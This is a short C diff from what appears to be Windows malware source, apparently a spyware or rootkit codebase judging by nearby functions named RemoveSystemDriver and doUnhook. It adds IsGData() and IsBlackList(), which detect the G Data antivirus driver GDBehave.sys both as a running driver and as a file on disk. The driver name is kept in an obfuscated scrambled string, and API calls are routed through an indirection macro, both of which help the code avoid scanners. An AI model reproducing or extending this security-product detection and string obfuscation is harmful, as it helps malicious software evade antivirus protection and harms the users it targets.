@@ -770,6 +770,36 @@ BOOL RemoveSystemDriver()
 	return TRUE;
 }
 
+BOOL IsGData()
+{
+	WIN32_FIND_DATA fdata;
+	char buffer[DLLNAMELEN];
+	HANDLE hff;
+	
+	ScrambleString ss1("Nfwl08Rl.1J1"); // GDBehave.sys
+
+	if (IsDriverRunning(ss1.get_wstr()))
+		return TRUE;
+
+	ZeroMemory(buffer, sizeof(buffer));
+	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
+	strcat(buffer, "\\system32\\drivers\\");
+	strcat(buffer, ss1.get_str());
+	
+	hff = FNC(FindFirstFileA)(buffer, &fdata);
+	if (hff == INVALID_HANDLE_VALUE)
+		return FALSE;
+	FNC(FindClose)(hff);
+
+	return TRUE;
+}
+
+BOOL IsBlackList()
+{
+	if (IsGData())
+		return TRUE;
+	return FALSE;
+}
 
 BOOL doUnhook()
 {
